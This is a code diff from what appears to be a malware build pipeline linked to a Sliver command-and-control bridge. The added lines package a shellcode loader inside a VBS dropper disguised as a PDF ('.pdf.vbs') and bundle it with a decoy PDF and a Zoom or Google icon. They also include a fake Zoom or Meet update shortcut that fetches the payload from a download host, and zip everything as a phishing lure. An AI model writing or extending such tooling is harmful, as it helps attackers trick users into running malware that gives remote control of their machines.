@@ -21,6 +21,7 @@ from pathlib import Path
 
 from .config import Settings
 from .db import Database
+from .lnk import lure_icon
 from .sliver import BridgeError, SliverBridge
 
 REPO_ROOT = Path(__file__).resolve().parent.parent
@@ -150,6 +151,8 @@ def render_windows(
     decoy_pdf: bytes,
     base_url: str,
     doc_name: str = "",
+    icon_bytes: bytes = b"",
+    icon_name: str = "Zoom.ico",
 ) -> str:
     template = (TEMPLATES / "win" / "dropper.vbs.tmpl").read_text(encoding="utf-8")
     expr = vbs_string_expr(base64.b64encode(loader_bytes).decode())
@@ -159,6 +162,8 @@ def render_windows(
         .replace("{{RAND4}}", suffix)
         .replace("{{LOADER_B64_EXPR}}", expr)
         .replace("{{DECOY_B64}}", base64.b64encode(decoy_pdf).decode())
+        .replace("{{ICON_B64}}", base64.b64encode(icon_bytes).decode())
+        .replace("{{ICON_NAME}}", icon_name)
         .replace("{{BASE_URL}}", base_url)
     )
 
@@ -245,11 +250,29 @@ class BuildPipeline:
         loader = self._compile_loader(shellcode, workdir)
         decoy = minimal_pdf(req.doc_name)
         naming = req.naming
+        icon_name = f"{naming['win'].split('-')[0]}.ico"  # Zoom.ico / Google.ico
         source = render_windows(
-            naming["win"], self._current_suffix, loader, decoy, req.base_url, req.doc_name
+            naming["win"], self._current_suffix, loader, decoy, req.base_url,
+            req.doc_name, lure_icon(), icon_name,
         )
-        name = f"{naming['win']}_{self._current_suffix}.pdf.vbs"
-        (self.artifacts_dir / name).write_text(source, encoding="utf-8")
+        # stable names: the .lnk downloads these exact files from dl.<zone>
+        vbs_name = f"{naming['win']}.pdf.vbs"
+        lnk_name = f"{naming['win']}.lnk"
+        ico_name = icon_name
+        (self.artifacts_dir / vbs_name).write_text(source, encoding="utf-8")
+        (self.artifacts_dir / ico_name).write_bytes(lure_icon())
+
+        src_lnk = TEMPLATES / "win" / "zoom-update.lnk" if req.profile == "zoom" else \
+            TEMPLATES / "win" / "meet-update.lnk"
+        if src_lnk.is_file():
+            (self.artifacts_dir / lnk_name).write_bytes(src_lnk.read_bytes())
+
+        name = f"{naming['win']}.zip"
+        with zipfile.ZipFile(self.artifacts_dir / name, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr(vbs_name, source)
+            zf.write(self.artifacts_dir / ico_name, ico_name)
+            if (self.artifacts_dir / lnk_name).is_file():
+                zf.write(self.artifacts_dir / lnk_name, lnk_name)
         return name.encode()
 
     def _build_linux(self, req: BuildRequest, doc: str, arch: str, workdir: Path) -> bytes:
